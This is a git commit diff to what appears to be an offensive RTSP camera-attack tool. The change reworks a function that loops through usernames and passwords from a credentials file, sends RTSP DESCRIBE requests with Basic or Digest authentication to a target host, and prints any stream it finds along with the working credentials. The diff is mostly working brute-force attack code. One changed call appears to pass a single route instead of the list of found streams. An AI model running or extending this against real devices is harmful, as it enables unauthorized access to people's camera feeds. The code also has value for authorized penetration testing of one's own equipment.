f11a27f91188b5cb06c46b2ee38684710e0a1ee7
analyserdmz <cdoctor2015@gmail.com>
2020-05-20 20:55:42 +0300

    Digest authentication (probably) fixed. Still needs extensive testing.
    Some Digest Auth fixes.

--- libs/attack_routes_first.py
+++ libs/attack_routes_first.py
@@ -15,74 +15,34 @@ def attack_creds_after_routes(target, port, authmethod, urlList):
     with open(os.path.join(os.path.dirname(__file__), 'resources\\creds.json'), 'r') as f:
         userpasslist = json.load(f)
 
-#describeURL = urljoin(url, urlparse(url).path)
-    foundUsername = ""
-    foundPassword = ""
-
     for url in urlList:
-        if foundUsername == "" and foundPassword == "":
-            for username in userpasslist['usernames']:
-                for password in userpasslist['passwords']:
-                    try:
-                        describeURL = url
-                        describeURL = describeURL.replace("invalidusername", username).replace("invalidpassword", password)
-                        # print(describeURL)
-                        # connect in loop, to avoid socket disconnections
-                        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-                        s.settimeout(10)
-                        s.connect((target,port))
+        for username in userpasslist['usernames']:
+            for password in userpasslist['passwords']:
+                try:
+                    describeURL = "rtsp://{}:{}/{}".format(target, port, url)
+                    describeURL = describeURL.replace("invalidusername", username).replace("invalidpassword", password)
+                    # print(describeURL)
+                    # connect in loop, to avoid socket disconnections
+                    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                    s.settimeout(10)
+                    s.connect((target,port))
 
-                        if authmethod == "digest":
-                            s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ""))
-                            received = s.recv(ah.configJson["bufLen"]).decode()
-                            # print(receivedBuffer)
-                            seq += 1
-                        else:
-                            received = ""
-
-                        route = urlparse(describeURL).path
-                        s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ah.authBuilder(authmethod, received, username, password, route)))
-                        receivedBuffer = s.recv(ah.configJson["bufLen"]).decode()
+                    if authmethod == "digest":
+                        s.send(ah.genDESCRIBE("/{}".format(url),seq,ah.configJson["clUagent"], ""))
+                        received = s.recv(ah.configJson["bufLen"]).decode()
+                        # print(receivedBuffer)
                         seq += 1
-                        if "RTSP/1.0 200" in receivedBuffer:
-                            foundUsername = username
-                            foundPassword = password
-                            successNum += 1
-                            print(colored("[+] Found Stream: {}".format(url.replace("rtsp://", "rtsp://{}:{}@".format(username, password))), 'green'))
-                    except:
-                        pass
-                    if foundUsername != "" and foundPassword != "":
-                        break
-                if foundUsername != "" and foundPassword != "":
-                    break
-        else:
-            try:
-                describeURL = url
-                describeURL = describeURL.replace("invalidusername", foundUsername).replace("invalidpassword", foundPassword)
-                print(describeURL)
-                # connect in loop, to avoid socket disconnections
-                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-                s.settimeout(10)
-                s.connect((target,port))
+                    else:
+                        received = ""
 
-
-                if authmethod == "digest":
-                    s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ""))
-                    received = s.recv(ah.configJson["bufLen"]).decode()
-                    # print(receivedBuffer)
+                    s.send(ah.genDESCRIBE("/{}".format(url),seq,ah.configJson["clUagent"], ah.authBuilder(authmethod, received, username, password, "/{}".format(url))))
+                    receivedBuffer = s.recv(ah.configJson["bufLen"]).decode()
                     seq += 1
-                else:
-                    received = ""
-
-                route = urlparse(describeURL).path
-                s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ah.authBuilder(authmethod, received, username, password, route)))
-                receivedBuffer = s.recv(ah.configJson["bufLen"]).decode()
-                seq += 1
-                if "RTSP/1.0 200" in receivedBuffer:
-                    successNum += 1
-                    print(colored("[+] Found Stream: {}".format(url.replace("rtsp://", "rtsp://{}:{}@".format(username, password))), 'green'))
-            except:
-                pass
+                    if "RTSP/1.0 200" in receivedBuffer:
+                        successNum += 1
+                        print(colored("[+] Found Stream: {}".format(describeURL.replace("rtsp://", "rtsp://{}:{}@".format(username, password))), 'green'))
+                except:
+                    pass
     if successNum > 0:
         print(colored("-" * 40, 'cyan'))
 
@@ -106,9 +66,9 @@ def findValidRoutes(target, port):
             if "RTSP/1.0 401" in receivedBuffer or "RTSP/1.0 403" in receivedBuffer:
                 if authmethod == "": # Detect AUTH method, at the first found route
                     authmethod = getAUTH.detect_auth(target, port)
-                if describeURL not in foundStreams:
-                    foundStreams.append(describeURL)
+                if route not in foundStreams:
+                    foundStreams.append(route)
                     # print(colored("[+] Found stream {}".format(describeURL), 'cyan'))
         except:
             pass
-    attack_creds_after_routes(target, port, authmethod, foundStreams)
+    attack_creds_after_routes(target, port, authmethod, route)
